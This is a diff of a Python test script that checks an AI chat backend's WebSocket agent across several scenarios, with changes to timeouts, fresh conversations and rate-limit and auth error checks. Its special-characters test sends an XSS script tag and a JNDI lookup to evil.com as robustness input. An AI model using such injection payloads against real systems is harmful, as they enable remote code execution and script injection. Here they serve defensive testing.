@@ -21,7 +21,7 @@ load_dotenv(dotenv_path=Path(__file__).resolve().parent / ".env.debug")
 
 
 @dataclass
-class TestResult:
+class PipelineResult:
     model: str
     test: str
     passed: bool
@@ -176,9 +176,9 @@ async def receiver(ws, session: SessionState) -> None:
             session.log_failure(f"WebSocket connection closed unexpectedly: {e}")
 
 
-async def send_message(ws, session: SessionState, message: str, wait_complete: bool = True) -> TestResult:
+async def send_message(ws, session: SessionState, message: str, wait_complete: bool = True) -> PipelineResult:
     if session.connection_closed.is_set():
-        return TestResult(session.model, "send", False, error_msg="Connection closed")
+        return PipelineResult(session.model, "send", False, error_msg="Connection closed")
 
     session.last_user_message = message
     session.seen_first_token = False
@@ -206,16 +206,16 @@ async def send_message(ws, session: SessionState, message: str, wait_complete: b
         await ws.send(json.dumps(payload))
     except websockets.ConnectionClosed as e:
         session.log_failure(f"Failed to send message: {e}")
-        return TestResult(session.model, "send", False, error_msg=str(e))
+        return PipelineResult(session.model, "send", False, error_msg=str(e))
 
     if wait_complete:
         try:
-            await asyncio.wait_for(session.turn_complete.wait(), timeout=60.0)
+            await asyncio.wait_for(session.turn_complete.wait(), timeout=180.0)
         except asyncio.TimeoutError:
-            return TestResult(session.model, "timeout", False, error_msg="Timeout waiting for response")
+            return PipelineResult(session.model, "timeout", False, error_msg="Timeout waiting for response")
         except Exception as e:
             if session.connection_closed.is_set():
-                return TestResult(session.model, "send", False, error_msg="Connection closed during wait")
+                return PipelineResult(session.model, "send", False, error_msg="Connection closed during wait")
             raise
 
     # Analyze results
@@ -227,7 +227,7 @@ async def send_message(ws, session: SessionState, message: str, wait_complete: b
 
     error_msg = session.error_event.get("message") if session.error_event else None
 
-    return TestResult(
+    return PipelineResult(
         model=session.model,
         test="send",
         passed=not has_error and has_done,
@@ -239,7 +239,7 @@ async def send_message(ws, session: SessionState, message: str, wait_complete: b
 
 
 async def run_test_matrix(backend_url: str, token: str, provider: str, base_url: str, api_key: str,
-                          model: str, conversation_id: int, failure_log: Path) -> list[TestResult]:
+                          model: str, conversation_id: int, failure_log: Path) -> list[PipelineResult]:
     ws_base = _to_ws_url(backend_url)
     ws_url = f"{ws_base}/api/chat/ws/agent?token={token}"
 
@@ -264,7 +264,11 @@ async def run_test_matrix(backend_url: str, token: str, provider: str, base_url:
         print(f"Testing model: {model}")
         print(f"{'='*60}")
 
-        def print_result(result: TestResult):
+        async def use_fresh_conversation() -> None:
+            session.conversation_id = await create_conversation(backend_url, token)
+            await asyncio.sleep(1.7)
+
+        def print_result(result: PipelineResult):
             ttft_str = f"{result.ttft:.2f}s" if result.ttft else "N/A"
             rtt_str = f"{result.rtt:.2f}s" if result.rtt else "N/A"
             status = "PASS" if result.passed else "FAIL"
@@ -281,12 +285,12 @@ async def run_test_matrix(backend_url: str, token: str, provider: str, base_url:
         result.passed = result.passed and result.ttft is not None
         results.append(result)
         print_result(result)
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test B: Multi-turn context retention
         print(f"\n[B] Multi-turn context...")
         await send_message(ws, session, "My favorite color is teal. Remember this.")
-        await asyncio.sleep(1.0)
+        await asyncio.sleep(1.7)
         result = await send_message(ws, session, "What did I just say my favorite color was?")
         result.test = "B"
         response_text = " ".join(
@@ -297,7 +301,7 @@ async def run_test_matrix(backend_url: str, token: str, provider: str, base_url:
         print_result(result)
         if "teal" not in response_text:
             print(f"       Response text: {response_text[:200]}")
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test C: Tool-calling (ask about files/workspace)
         print(f"\n[C] Tool-calling...")
@@ -310,7 +314,7 @@ async def run_test_matrix(backend_url: str, token: str, provider: str, base_url:
         print_result(result)
         if not has_tool_call:
             print(f"       WARNING: No tool_call event received")
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test D: Long input
         print(f"\n[D] Long input...")
@@ -322,7 +326,7 @@ async def run_test_matrix(backend_url: str, token: str, provider: str, base_url:
         result.passed = result.passed and result.ttft is not None
         results.append(result)
         print_result(result)
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test E: Special characters / injection-shaped input
         print(f"\n[E] Special characters...")
@@ -338,7 +342,7 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
         result.passed = result.passed and result.ttft is not None
         results.append(result)
         print_result(result)
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test F: Empty/garbage input
         print(f"\n[F] Empty/garbage input...")
@@ -347,7 +351,7 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
         result.passed = result.passed and result.ttft is not None
         results.append(result)
         print_result(result)
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test G: Rapid consecutive messages (send second before first completes)
         print(f"\n[G] Rapid consecutive messages...")
@@ -376,7 +380,7 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
         try:
             await ws.send(json.dumps(payload1))
         except websockets.ConnectionClosed as e:
-            result = TestResult(session.model, "G", False, error_msg=f"Connection closed: {e}")
+            result = PipelineResult(session.model, "G", False, error_msg=f"Connection closed: {e}")
             results.append(result)
             print_result(result)
             recv_task.cancel()
@@ -384,15 +388,6 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
 
         # Send second immediately without waiting
         await asyncio.sleep(0.1)
-
-        session.last_user_message = "Second rapid message"
-        session.seen_first_token = False
-        session.response_started = False
-        session.turn_complete.clear()
-        session.received_events = []
-        session.ttft = None
-        session.rtt = None
-        session.error_event = None
 
         payload2 = {
             "conversation_id": session.conversation_id,
@@ -406,32 +401,36 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
             "local_backend_mode": "ollama",
             "client_type": "web",
         }
-        session.last_send_time = time.monotonic()
         try:
             await ws.send(json.dumps(payload2))
         except websockets.ConnectionClosed as e:
-            result = TestResult(session.model, "G", False, error_msg=f"Connection closed: {e}")
+            result = PipelineResult(session.model, "G", False, error_msg=f"Connection closed: {e}")
             results.append(result)
             print_result(result)
             recv_task.cancel()
             return results
 
-        try:
-            await asyncio.wait_for(session.turn_complete.wait(), timeout=30.0)
-        except asyncio.TimeoutError:
-            pass
+        deadline = time.monotonic() + 180.0
+        while time.monotonic() < deadline:
+            done_count = sum(1 for e in session.received_events if e.get("type") == "done")
+            if done_count >= 1 or session.connection_closed.is_set():
+                break
+            await asyncio.sleep(0.25)
 
-        # Check if we got two separate responses (at least two 'done' events)
+        # The server's contract is one accepted request plus a structured cooldown error.
         done_count = sum(1 for e in session.received_events if e.get("type") == "done")
-        has_error = session.error_event is not None
-        result = TestResult(
+        rate_limit_errors = [
+            e for e in session.received_events
+            if e.get("type") == "error" and e.get("category") == "rate_limit"
+        ]
+        result = PipelineResult(
             model=session.model,
             test="G",
-            passed=done_count >= 2 and not has_error,
+            passed=done_count >= 1 and len(rate_limit_errors) == 1 and not session.connection_closed.is_set(),
             ttft=session.ttft,
             rtt=session.rtt,
-            error_msg=session.error_event.get("message") if session.error_event else ("Connection closed" if session.connection_closed.is_set() else None),
-            details=f"done_events={done_count}"
+            error_msg=rate_limit_errors[0].get("message") if rate_limit_errors else ("Connection closed" if session.connection_closed.is_set() else None),
+            details=f"done_events={done_count}, rate_limit_errors={len(rate_limit_errors)}"
         )
         results.append(result)
         print_result(result)
@@ -439,7 +438,7 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
             print("  WARNING: Connection was closed during test G")
             recv_task.cancel()
             return results
-        await asyncio.sleep(1.0)
+        await use_fresh_conversation()
 
         # Test H: Deliberate failure - invalid API key
         print(f"\n[H] Invalid API key...")
@@ -472,7 +471,7 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
         try:
             await ws.send(json.dumps(payload))
         except websockets.ConnectionClosed as e:
-            result = TestResult(session.model, "H", False, error_msg=f"Connection closed: {e}")
+            result = PipelineResult(session.model, "H", False, error_msg=f"Connection closed: {e}")
             results.append(result)
             print_result(result)
             session.api_key = old_api_key
@@ -487,17 +486,16 @@ Special: <script>alert('xss')</script> ${jndi:ldap://evil.com}'''
 
         has_error = session.error_event is not None
         error_msg = session.error_event.get("message") if session.error_event else None
-        # Check if error mentions auth/unauthorized
-        is_auth_error = has_error and any(kw in (error_msg or "").lower() for kw in ["auth", "unauthorized", "401", "api key", "invalid"])
+        is_auth_error = has_error and session.error_event.get("category") == "provider_auth" and session.error_event.get("status_code") == 401
         
-        result = TestResult(
+        result = PipelineResult(
             model=session.model,
             test="H",
             passed=has_error and is_auth_error,
             ttft=session.ttft,
             rtt=session.rtt,
             error_msg=error_msg,
-            details=f"has_error={has_error}, is_auth_error={is_auth_error}"
+            details=f"has_error={has_error}, category={session.error_event.get('category') if session.error_event else None}, status_code={session.error_event.get('status_code') if session.error_event else None}"
         )
         results.append(result)
         print_result(result)
@@ -573,7 +571,7 @@ async def main():
             all_results.extend(results)
         except Exception as e:
             print(f"  ERROR testing {model}: {e}")
-            all_results.append(TestResult(model, "CONNECTION", False, error_msg=str(e)))
+            all_results.append(PipelineResult(model, "CONNECTION", False, error_msg=str(e)))
 
     # Summary
     print(f"\n{'='*60}")
